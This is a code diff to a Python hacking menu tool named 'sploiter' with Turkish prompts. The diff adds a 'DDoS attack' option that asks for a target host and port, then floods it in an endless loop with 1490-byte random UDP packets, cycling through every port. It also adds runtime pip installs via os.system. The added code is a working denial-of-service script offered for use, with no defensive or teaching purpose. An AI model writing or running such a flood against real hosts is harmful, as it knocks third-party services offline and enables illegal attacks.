@@ -13,6 +13,19 @@ import requests
 import platform
 
 from colorama import Fore, Style
+
+import scapy.all as scapy
+
+import random
+
+os.system("pip3 install ipaddress")
+
+os.system("pip3 install requests")
+
+os.system("pip3 install colorama")
+
+os.system("pip3 install scapy")
+
 print(Fore.RED + "")
 
 os.system("figlet sploiter")
@@ -126,6 +139,8 @@ print(Fore.BLUE + """
 
 [5] SUBNET SCANNER
 
+[6] DDOS SALDIRISI YAP
+
 """)
 
 print(Style.RESET_ALL)
@@ -178,6 +193,55 @@ if islemno=="5":
 
         print(subnet)
 
+if islemno == "6":
+
+    mydate = time.strftime('%Y-%m-%d')
+
+    mytime = time.strftime('%H-%M')
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+    bytes = random._urandom(1490)
+
+    print(Fore.BLUE + "")
+
+    os.system("figlet DDOS")
+
+    time.sleep(1)
+
+    print(Fore.YELLOW + "------------------------------- ")
+
+    ip = input("HEDEF HOST GİR : ")
+
+    time.sleep(1)
+
+    port = int(input("HEDEF PORT GİR : "))
+
+    print("SALDIRI BAŞLATILIYOR...")
+
+    print("HEDEF HOST", ip, "HEDEF PORT", port, "...")
+
+    time.sleep(5)
+
+    sent = 0
+
+    while True:
+
+        sock.sendto(bytes, (ip, port))
+
+        sent = sent + 1
+
+        port = port + 1
+
+        print("Sent %s packet to %s through port:%s" % (sent, ip, port))
+
+        if port == 65535:
+
+            port = 1
+
+    input("çıkmak için enter tuşuna bas...")
+            
+   
 islemno = input("LÜTFEN 1 SAYISINA TIKLAYINIZ:  ")
 
 print("--------------------------------------")
